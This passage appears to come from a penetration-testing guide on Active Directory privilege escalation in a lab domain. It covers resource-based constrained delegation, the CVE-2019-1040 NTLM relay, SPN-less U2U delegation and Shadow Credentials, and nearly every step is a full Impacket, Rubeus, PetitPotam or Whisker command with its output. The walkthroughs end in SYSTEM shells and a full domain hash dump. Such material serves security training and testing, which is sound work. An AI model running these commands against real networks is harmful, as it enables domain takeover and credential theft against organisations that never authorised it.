{: .prompt-info }

#### Linux Attack Path

**Step 1: Create a New Machine Account**

```bash
hacker@root[/root]$ addcomputer.py -computer-name 'YOURCOMPUTER$' -computer-pass 'ComputerPassword1!' -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/svc_web:Password123'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Successfully added machine account YOURCOMPUTER$ with password ComputerPassword1!.
```

**Step 2: Set RBCD on the Target Computer**

```bash
hacker@root[/root]$ rbcd.py -delegate-from 'YOURCOMPUTER$' -delegate-to 'WS01$' -dc-ip 172.16.117.3 -action write 'INLANEFREIGHT.LOCAL/svc_web:Password123'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] YOURCOMPUTER$ can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     YOURCOMPUTER$    (S-1-5-21-3842939050-3880317879-2865463114-5601)
```

**Step 3: Request the Impersonated Service Ticket**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/WS01.INLANEFREIGHT.LOCAL' -impersonate 'Administrator' -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/YOURCOMPUTER$:ComputerPassword1!'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

**Step 4: Pass-the-Ticket**

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass WS01.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on WS01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file mQzTpBkH.exe
[*] Opening SVCManager on WS01.INLANEFREIGHT.LOCAL.....
[*] Creating service LdHx on WS01.INLANEFREIGHT.LOCAL.....
[*] Starting service LdHx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### Windows Attack Path

**Step 1: Create a New Machine Account with PowerMad**

```powershell
PS C:\Tools> Import-Module .\Powermad.ps1
PS C:\Tools> New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString 'ComputerPassword1!' -AsPlainText -Force)
[+] Machine Account YOURCOMPUTER$ added
```

**Step 2: Set RBCD on the Target**

```powershell
PS C:\Tools> $ComputerSid = Get-DomainComputer YOURCOMPUTER -Properties objectSid | Select-Object -Expand objectSid
PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Tools> Get-DomainComputer WS01 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
PS C:\Tools> Get-DomainComputer WS01 -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

**Step 3: Use Rubeus for S4U Attack**

```powershell
PS C:\Tools> .\Rubeus.exe hash /password:ComputerPassword1! /user:YOURCOMPUTER$ /domain:INLANEFREIGHT.LOCAL

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: Calculate Password Hash(es)

[*] Input password             : ComputerPassword1!
[*] Input username             : YOURCOMPUTER$
[*] Input domain               : INLANEFREIGHT.LOCAL
[*] Salt                       : INLANEFREIGHT.LOCALhostYOURCOMPUTER.INLANEFREIGHT.LOCAL
[*]       rc4_hmac             : 7F3B1C4A2E8D5F9A0B6C3D7E1A2F4C8D
[*]       aes128_cts_hmac_sha1 : A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6
[*]       aes256_cts_hmac_sha1 : D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4
[*]       des_cbc_md5          : A1B2C3D4E5F6A7B8

PS C:\Tools> .\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:7F3B1C4A2E8D5F9A0B6C3D7E1A2F4C8D /impersonateuser:Administrator /msdsspn:cifs/WS01.INLANEFREIGHT.LOCAL /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: S4U

[*] Using rc4_hmac hash: 7F3B1C4A2E8D5F9A0B6C3D7E1A2F4C8D
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\YOURCOMPUTER$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF...

[*] Action: S4U

[*] Building S4U2self request for: 'YOURCOMPUTER$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[*] Sending S4U2self request to 172.16.117.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'YOURCOMPUTER$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

      doIF...

[*] Impersonating user 'Administrator' to target SPN 'cifs/WS01.INLANEFREIGHT.LOCAL'
[*] Building S4U2proxy request for service: 'cifs/WS01.INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[*] Sending S4U2proxy request to domain controller 172.16.117.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi):

      doIF...

[+] Ticket successfully imported!
```

**Step 4: Access the Target**

```powershell
PS C:\Tools> dir \\WS01.INLANEFREIGHT.LOCAL\C$

    Directory: \\WS01.INLANEFREIGHT.LOCAL\C$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/10/2026   3:45 PM                PerfLogs
d-r---         3/15/2026   8:22 AM                Program Files
d-r---         1/28/2026   2:11 PM                Program Files (x86)
d-r---         3/20/2026   9:00 AM                Users
d-----         3/21/2026   4:33 PM                Windows

PS C:\Tools> psexec.exe \\WS01.INLANEFREIGHT.LOCAL cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Scenario 3: RBCD via CVE-2019-1040 (Drop the MIC — SMB to LDAP Relay)

**Prerequisites:**
- Domain Controller vulnerable to CVE-2019-1040 (unpatched, pre-June 2019)
- Two DCs in the domain (DC01 and DC02) or any machine that can be coerced
- LDAP signing not enforced
- MachineAccountQuota > 0

> CVE-2019-1040 allows us to relay **SMB** authentication (which normally negotiates signing) to **LDAP** by stripping the MIC and signing flags. This is critical because many coercion methods (PrinterBug, PetitPotam to SMB) produce SMB-based authentication that cannot normally be relayed to LDAP.
{: .prompt-danger }

#### Linux Attack Path

**Step 1: Start ntlmrelayx with --remove-mic**

```bash
hacker@root[/root]$ sudo ntlmrelayx.py --remove-mic -t ldap://172.16.117.3 --delegate-access --escalate-user 'FAKEMACHINE$' -smb2support
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Servers started, waiting for connections
```

**Step 2: Trigger Authentication via PetitPotam (SMB coercion)**

```bash
hacker@root[/root]$ python3 PetitPotam.py -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL 172.16.117.100 172.16.117.4
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Step 3: ntlmrelayx Removes MIC and Relays to LDAP**

```bash
[*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.117.4, attacking target ldap://172.16.117.3
[*] Removing MIC from NTLM_AUTHENTICATE message
[*] Unsetting NTLMSSP_NEGOTIATE_SIGN flag
[*] Unsetting NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag
[*] Unsetting NEGOTIATE_KEY_EXCHANGE flag
[*] Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/DC02$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: FAKEMACHINE$ and password: rT#9kLm!pQ2wXsZ result: OK
[*] Delegation rights modified successfully! FAKEMACHINE$ can now impersonate users on DC02$ via S4U2Proxy
```

**Step 4: Obtain Service Ticket and Access DC02**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/DC02.INLANEFREIGHT.LOCAL' -impersonate Administrator -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/FAKEMACHINE$:rT#9kLm!pQ2wXsZ'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC02.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache

hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_DC02.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ secretsdump.py -k -no-pass DC02.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
[*] NL$KM
[*] _SC_NTDS
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
```

> This is a full domain compromise. By relaying DC02's authentication to LDAP on DC01, we set RBCD on DC02 itself, then impersonated Administrator to DCSync the entire domain.
{: .prompt-danger }

---

### Scenario 4: RBCD with MachineAccountQuota = 0 (Using Existing Compromised Computer Account)

**Prerequisites:**
- MachineAccountQuota = 0 (cannot create new machine accounts)
- Already compromised a computer account (have its hash or password)
- Write access to the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (via relay or ACL)

> When MAQ is set to 0, you cannot create new machine accounts. However, if you have already compromised a computer account (e.g., through credential dumping from a previously compromised host), you can use that account for the RBCD delegation.
{: .prompt-warning }

#### Linux Attack Path

**Step 1: Start ntlmrelayx Using the Compromised Computer Account**

Assume we have the NTLM hash of `SRV01$`: `aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d`

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -t ldaps://172.16.117.3 --delegate-access --escalate-user 'SRV01$' -smb2support
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

**Step 2: Trigger Coercion Against WS01 (WebDAV)**

```bash
hacker@root[/root]$ python3 PetitPotam.py -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL 172.16.117.100@80/test 172.16.117.20

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Step 3: ntlmrelayx Sets RBCD Using the Existing Computer Account**

```bash
[*] HTTPD(80): Connection from 172.16.117.20 controlled, attacking target ldaps://172.16.117.3
[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] No new computer account will be created (using existing: SRV01$)
[*] Delegation rights modified successfully! SRV01$ can now impersonate users on WS01$ via S4U2Proxy
```

**Step 4: Request Service Ticket Using the Compromised Computer Hash**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/WS01.INLANEFREIGHT.LOCAL' -impersonate Administrator -hashes 'aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d' -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/SRV01$'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

**Step 5: Pass-the-Ticket**

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass WS01.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on WS01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file pZxTjKmN.exe
[*] Opening SVCManager on WS01.INLANEFREIGHT.LOCAL.....
[*] Creating service hQwR on WS01.INLANEFREIGHT.LOCAL.....
[*] Starting service hQwR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### Windows Attack Path

**Step 1: Set RBCD Using the Compromised Machine (Rubeus + PowerView)**

```powershell
PS C:\Tools> $SRV01Sid = Get-DomainComputer SRV01 -Properties objectSid | Select-Object -Expand objectSid
PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SRV01Sid))"
PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Tools> Get-DomainComputer WS01 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
```

**Step 2: Perform S4U Attack with Rubeus**

```powershell
PS C:\Tools> .\Rubeus.exe s4u /user:SRV01$ /rc4:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d /impersonateuser:Administrator /msdsspn:cifs/WS01.INLANEFREIGHT.LOCAL /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: S4U

[*] Using rc4_hmac hash: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\SRV01$'
[+] TGT request successful!
[*] Action: S4U
[*] Building S4U2self request for: 'SRV01$@INLANEFREIGHT.LOCAL'
[+] S4U2self success!
[*] Building S4U2proxy request for service: 'cifs/WS01.INLANEFREIGHT.LOCAL'
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

---

### Scenario 5: RBCD with MachineAccountQuota = 0 (SPN-less RBCD via U2U — James Forshaw Technique)

**Prerequisites:**
- MachineAccountQuota = 0 (cannot create new machine accounts)
- Control over a **sacrificial user account** (the account's password will be temporarily changed)
- Write access to the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute

> This technique, discovered by James Forshaw in 2022, allows RBCD abuse even when MAQ = 0 and you do NOT have a compromised machine account. It uses the U2U (User-to-User) Kerberos extension to perform S4U2Self without needing an SPN. The downside is that it **temporarily breaks the sacrificial user account** by replacing its password hash with the TGT session key.
{: .prompt-warning }

#### Linux Attack Path

**Step 1: Set RBCD on the Target to Trust the Sacrificial User**

Assume we have write access to WS01 via an ACL and we control user `svc_sacrifice` with password `SacrificePass1!`:

```bash
hacker@root[/root]$ rbcd.py -delegate-from 'svc_sacrifice' -delegate-to 'WS01$' -dc-ip 172.16.117.3 -action write 'INLANEFREIGHT.LOCAL/svc_web:Password123'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] svc_sacrifice can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     svc_sacrifice    (S-1-5-21-3842939050-3880317879-2865463114-1138)
```

**Step 2: Obtain TGT for the Sacrificial User via Overpass-the-Hash**

We use RC4 since we need to extract the session key:

```bash
hacker@root[/root]$ getTGT.py -hashes :$(pypykatz crypto nt 'SacrificePass1!') 'INLANEFREIGHT.LOCAL/svc_sacrifice'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Saving ticket in svc_sacrifice.ccache
```

**Step 3: Extract TGT Session Key**

```bash
hacker@root[/root]$ describeTicket.py 'svc_sacrifice.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
```

**Step 4: Change the Sacrificial User's Password Hash to the TGT Session Key**

```bash
hacker@root[/root]$ changepasswd.py -newhashes ':a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2' 'INLANEFREIGHT.LOCAL/svc_sacrifice:SacrificePass1!@172.16.117.3'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Setting the password for svc_sacrifice as svc_sacrifice
[*] Connecting to DCE/RPC as svc_sacrifice
[*] Password was changed successfully.
```

> At this point, the sacrificial account's password has been changed to an unknown plaintext (the hash IS the TGT session key). This is why this must be a **sacrificial** account — real users would be locked out.
{: .prompt-danger }

**Step 5: Run getST.py with -u2u Flag for S4U2Self+U2U + S4U2Proxy**

```bash
hacker@root[/root]$ KRB5CCNAME='svc_sacrifice.ccache' getST.py -u2u -impersonate "Administrator" -spn "cifs/WS01.INLANEFREIGHT.LOCAL" -k -no-pass 'INLANEFREIGHT.LOCAL/svc_sacrifice'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

**Step 6: Reset the Sacrificial User's Password to the Old Value**

```bash
hacker@root[/root]$ changepasswd.py -hashes ':a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2' -newhashes ':'"$(pypykatz crypto nt 'SacrificePass1!')" 'INLANEFREIGHT.LOCAL/svc_sacrifice@172.16.117.3'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Setting the password for svc_sacrifice as svc_sacrifice
[*] Connecting to DCE/RPC as svc_sacrifice
[*] Password was changed successfully.
```

> Note: Domain password policy may prevent resetting to the exact same password. In that case, set a new password. The important thing is the account is usable again.
{: .prompt-tip }

**Step 7: Pass-the-Ticket**

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass WS01.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on WS01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file kBzHtWnM.exe
[*] Opening SVCManager on WS01.INLANEFREIGHT.LOCAL.....
[*] Creating service mLxQ on WS01.INLANEFREIGHT.LOCAL.....
[*] Starting service mLxQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Scenario 6: Shadow Credentials Attack via NTLM Relay

**Prerequisites:**
- AD CS enrolled or a DC with a keypair for PKINIT (Windows Server 2016+ DC)
- Write access to the target object's `msDS-KeyCredentialLink` attribute (via relay or ACL)
- LDAP signing not enforced (for relay variant)

> Shadow Credentials is an alternative to RBCD that does not require MAQ > 0. Instead of setting delegation rights, we add a key credential to the target's `msDS-KeyCredentialLink` attribute, then use PKINIT to authenticate as that account.
{: .prompt-info }

#### Linux Attack Path (via NTLM Relay)

**Step 1: Start ntlmrelayx with --shadow-credentials**

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -t ldaps://172.16.117.3 --shadow-credentials --shadow-target 'WS01$' -smb2support
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

**Step 2: Trigger Coercion (WebDAV)**

```bash
hacker@root[/root]$ python3 PetitPotam.py -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL 172.16.117.100@80/test 172.16.117.20

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Step 3: ntlmrelayx Writes Shadow Credential**

```bash
[*] HTTPD(80): Connection from 172.16.117.20 controlled, attacking target ldaps://172.16.117.3
[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Successfully added a new KeyCredential to the msDS-KeyCredentialLink attribute of WS01$
[*] DeviceID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[*] Certificate saved as: jYkRmTlW.pfx
[*] PFX password: BnMqTzW3xRpLkH
[*] A]TGT can now be obtained with: gettgtpkinit.py -cert-pfx jYkRmTlW.pfx -pfx-pass 'BnMqTzW3xRpLkH' 'INLANEFREIGHT.LOCAL/WS01$' WS01.ccache
```

**Step 4: Obtain TGT via PKINIT**

```bash
hacker@root[/root]$ python3 gettgtpkinit.py -cert-pfx jYkRmTlW.pfx -pfx-pass 'BnMqTzW3xRpLkH' 'INLANEFREIGHT.LOCAL/WS01$' WS01.ccache
2026-03-23 17:30:00,123 minikerberos INFO     Loading certificate and key
2026-03-23 17:30:00,456 minikerberos INFO     Requesting TGT
2026-03-23 17:30:01,789 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-03-23 17:30:01,790 minikerberos INFO     f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9
2026-03-23 17:30:01,791 minikerberos INFO     Saving ticket in WS01.ccache
```

**Step 5: Recover NT Hash**

```bash
hacker@root[/root]$ python3 getnthash.py -key 'f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9' 'INLANEFREIGHT.LOCAL/WS01$'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Using U2U to retrieve the NT hash for WS01$
[*] Using AS-REP keys: f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9
[*] NT hash for WS01$: 5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d
```

**Step 6: Use the Machine Hash for S4U2Self (Silver Ticket or S4U)**

```bash
hacker@root[/root]$ export KRB5CCNAME=WS01.ccache
hacker@root[/root]$ getST.py -spn 'cifs/WS01.INLANEFREIGHT.LOCAL' -impersonate Administrator -self -k -no-pass 'INLANEFREIGHT.LOCAL/WS01$'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Saving ticket in Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache

hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_WS01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass WS01.INLANEFREIGHT.LOCAL
C:\Windows\system32> whoami
nt authority\system
```

#### Linux Attack Path (Direct — pyWhisker)

**Step 1: Add Shadow Credential with pyWhisker**

```bash
hacker@root[/root]$ python3 pywhisker.py -d 'INLANEFREIGHT.LOCAL' -u 'svc_web' -p 'Password123' --target 'WS01$' --action 'add' --filename ws01_shadow --dc-ip 172.16.117.3
[*] Searching for the target account
[*] Target user found: CN=WS01,OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b2c3d4e5-f6a7-8901-bcde-f12345678901
[*] Updating the msDS-KeyCredentialLink attribute of WS01$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: ws01_shadow.pfx
[+] Must be used with password: S3kR9tPfXpAsS
[+] A]TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

**Step 2: Authenticate via PKINIT**

```bash
hacker@root[/root]$ python3 gettgtpkinit.py -cert-pfx ws01_shadow.pfx -pfx-pass 'S3kR9tPfXpAsS' 'INLANEFREIGHT.LOCAL/WS01$' ws01_shadow.ccache
2026-03-23 17:35:00,123 minikerberos INFO     Loading certificate and key
2026-03-23 17:35:00,456 minikerberos INFO     Requesting TGT
2026-03-23 17:35:01,789 minikerberos INFO     AS-REP encryption key:
2026-03-23 17:35:01,790 minikerberos INFO     e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6
2026-03-23 17:35:01,791 minikerberos INFO     Saving ticket in ws01_shadow.ccache
```

#### Windows Attack Path (Whisker)

**Step 1: Add Shadow Credential with Whisker**

```powershell
PS C:\Tools> .\Whisker.exe add /target:WS01$ /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password: qW3rTy7U1oP
[*] Searching for the target account
[*] Target user found: CN=WS01,OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: c3d4e5f6-a7b8-9012-cdef-123456789012
[*] Updating the msDS-KeyCredentialLink attribute of WS01$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

    Rubeus.exe asktgt /user:WS01$ /certificate:MIIJuA... /password:"qW3rTy7U1oP" /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL /getcredentials /show
```

**Step 2: Request TGT and NT Hash with Rubeus**

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:WS01$ /certificate:MIIJuA... /password:"qW3rTy7U1oP" /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and target domain INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\WS01$'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFnj...

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  WS01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/23/2026 5:40:00 PM
  EndTime                  :  3/24/2026 3:40:00 AM
  RenewTill                :  3/30/2026 5:40:00 PM
